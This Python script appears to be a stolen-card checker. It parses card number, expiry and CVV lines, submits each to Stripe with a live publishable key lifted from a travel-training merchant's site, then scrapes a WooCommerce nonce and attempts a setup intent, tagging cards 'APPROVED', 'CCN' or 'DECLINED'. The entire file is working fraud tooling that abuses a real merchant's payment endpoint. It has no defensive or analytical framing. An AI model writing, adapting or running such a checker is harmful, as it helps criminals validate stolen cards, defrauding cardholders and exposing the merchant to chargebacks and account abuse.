import requests

import re


def Tele(cc):
    try:
        session = requests.Session()
        
        card, mm, yy, cvv = cc.split("|")
        if "20" in yy:
            yy = yy.split("20")[1]

        headers = {
            'authority': 'api.stripe.com',
            'accept': 'application/json',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'referer': 'https://js.stripe.com/',
            'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-site',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36',
        }

        data = f'type=card&card[number]={card}&card[cvc]={cvv}&card[exp_year]={yy}&card[exp_month]={mm}&allow_redisplay=unspecified&billing_details[address][postal_code]=10080&billing_details[address][country]=US&key=pk_live_51JDCsoADgv2TCwvpbUjPOeSLExPJKxg1uzTT9qWQjvjOYBb4TiEqnZI1Sd0Kz5WsJszMIXXcIMDwqQ2Rf5oOFQgD00YuWWyZWX'
        response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data, timeout=20)
        res = response.text
        print(res)
    
        if 'error' in res:
            error_message = response.json()['error']['message']
            if 'code' in error_message:
                return "CCN ✅"
            else:
                return "DECLINED ❌"
        else:
            payment_method_id = response.json()['id']

            headers = {
                'authority': 'www.thetravelinstitute.com',
                'accept': '*/*',
                'accept-language': 'en-US,en;q=0.9',
                'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'origin': 'https://www.thetravelinstitute.com',
                'referer': 'https://www.thetravelinstitute.com/my-account/add-payment-method/',
                'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
                'sec-ch-ua-mobile': '?1',
                'sec-ch-ua-platform': '"Android"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36',
                'x-requested-with': 'XMLHttpRequest',
            }

            params = {
                'wc-ajax': 'wc_stripe_create_and_confirm_setup_intent',
            }
            response = session.get('https://www.thetravelinstitute.com/my-account/add-payment-method/', headers=headers,timeout=20)
            html=(response.text)
            nonce = re.search(r'createAndConfirmSetupIntentNonce":"([^"]+)"', html).group(1)

            data = {
                'action': 'create_and_confirm_setup_intent',
                'wc-stripe-payment-method': payment_method_id,
                'wc-stripe-payment-type': 'card',
                '_ajax_nonce': nonce,
            }

            response = session.post('https://www.thetravelinstitute.com/', params=params, headers=headers, data=data, timeout=20)
            res = response.json()
            print(res)

            if res['success'] == False:
                error = res['data']['error']['message']
                if 'code' in error:
                     return "CCN ✅"
                else:
                    return "DECLINED ❌"
            if res['success'] == True:
                return "APPROVED ✅"
            else:
                error = res['data']['error']['message']
                return error

    except Exception as e:
        print(f"Error in Tele function: {e}")
        return "Error"
        
        
        